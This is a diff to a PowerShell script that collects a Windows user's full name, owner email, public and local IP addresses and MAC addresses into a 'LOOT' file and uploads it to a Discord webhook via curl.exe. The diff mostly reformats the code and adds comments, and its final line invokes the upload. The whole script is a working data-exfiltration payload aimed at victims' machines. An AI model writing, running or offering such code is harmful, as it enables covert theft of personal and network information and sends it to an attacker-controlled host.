@@ -1,7 +1,8 @@
+# Define variables
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
 
+# Function to get full name
 function Get-FullName {
-
     try {
         $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
     }
@@ -9,29 +10,29 @@ function Get-FullName {
         Write-Error "No name was detected"
         return $env:UserName
     }
-
     return $fullName
 }
 
-function Get-email {
-    
+# Function to get email
+function Get-Email {
     try {
-
-    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
-    return $email
+        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
+        if (-not $email) {
+            throw "No email address found"
+        }
+        return $email
     }
-
-# If no email is detected function will return backup message for sapi speak
-
-    # Write Error is just for troubleshooting
-    catch {Write-Error "An email was not found" 
-    return "No Email Detected"
-    -ErrorAction SilentlyContinue
-    }        
+    catch {
+        Write-Error "An email was not found"
+        return "No Email Detected"
+    }
 }
 
-$email = Get-email
+# Invoke functions to populate variables
+$fullName = Get-FullName
+$email = Get-Email
 
+# Get public IP address
 try {
     $computerPubIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
 }
@@ -39,17 +40,20 @@ catch {
     $computerPubIP = "Error getting Public IP"
 }
 
+# Get local IP addresses
 $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 |
            Select-Object InterfaceAlias, IPAddress, PrefixOrigin | 
-           Format-Table -AutoSize | 
+           Format-Table -AutoSize |
            Out-String
 
+# Get MAC addresses
 $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" |
        Select-Object Name, MacAddress, Status |
        Format-Table -AutoSize |
        Out-String
-$output = @"
 
+# Construct output string
+$output = @"
 Full Name: $fullName
 
 Email: $email
@@ -62,13 +66,13 @@ $localIP
 
 MAC:
 $MAC
-
 "@
 
+# Save output to file
 $output > $FileName
 
+# Function to upload to Discord webhook
 function Upload-Discord {
-
     [CmdletBinding()]
     param (
         [parameter(Position=0, Mandatory=$False)]
@@ -90,6 +94,10 @@ function Upload-Discord {
     }
 
     if (-not [string]::IsNullOrEmpty($file)) {
+        # Use curl.exe or equivalent command to upload file
         curl.exe -F "file1=@$file" $hookurl
     }
 }
+
+# Example usage to upload the generated file to Discord
+Upload-Discord -file $FileName
